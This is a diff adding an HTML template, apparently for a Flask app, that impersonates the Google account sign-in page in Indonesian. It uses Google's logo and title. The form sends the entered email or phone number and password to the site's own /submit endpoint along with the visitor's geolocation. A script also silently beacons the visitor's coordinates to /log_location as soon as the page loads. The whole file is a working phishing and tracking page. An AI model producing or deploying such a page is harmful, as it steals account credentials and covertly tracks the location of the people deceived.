@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <link rel="icon" href="{{ url_for('static', filename='google.png') }}" type="image/x-icon">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style3.css') }}">
+    <script>
+        function sendLocation(event) {
+            event.preventDefault();
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    document.getElementById('latitude').value = position.coords.latitude;
+                    document.getElementById('longitude').value = position.coords.longitude;
+                    document.getElementById('login-form').submit();
+                });
+            } else {
+                console.log('Geolocation is not supported by this browser.');
+                document.getElementById('login-form').submit();
+            }
+        }
+
+        function logLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const data = new FormData();
+                    data.append('latitude', position.coords.latitude);
+                    data.append('longitude', position.coords.longitude);
+
+                    navigator.sendBeacon('/log_location', data);
+                });
+            }
+        }
+
+        window.onload = logLocation;
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
+            <h1 class="title">Login</h1>
+            <p class="tagline">Gunakan Akun Google Anda</p>
+        </div>
+        <div class="login-box">
+            <form id="login-form" action="/submit" method="post" onsubmit="sendLocation(event)">
+                <input type="text" id="email_or_phone" name="email_or_phone" placeholder="Email atau nomor telepon" required>
+                <input type="password" id="password" name="password" placeholder="Kata sandi" required>
+                <input type="hidden" id="latitude" name="latitude">
+                <input type="hidden" id="longitude" name="longitude">
+                <a href="#" class="forgot-email">Lupa email?</a>
+                <p class="guest-mode">Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. <a href="#">Pelajari lebih lanjut cara menggunakan Mode tamu</a></p>
+                <button type="submit" class="next-button">Selanjutnya</button>
+                <button type="button" class="create-account">Buat akun</button>
+            </form>
+        </div>
+        <footer>
+            <div class="languages">
+                <a href="#">Indonesia</a>
+                <!-- Add more language options if needed -->
+            </div>
+        </footer>
+    </div>
+</body>
+</html>
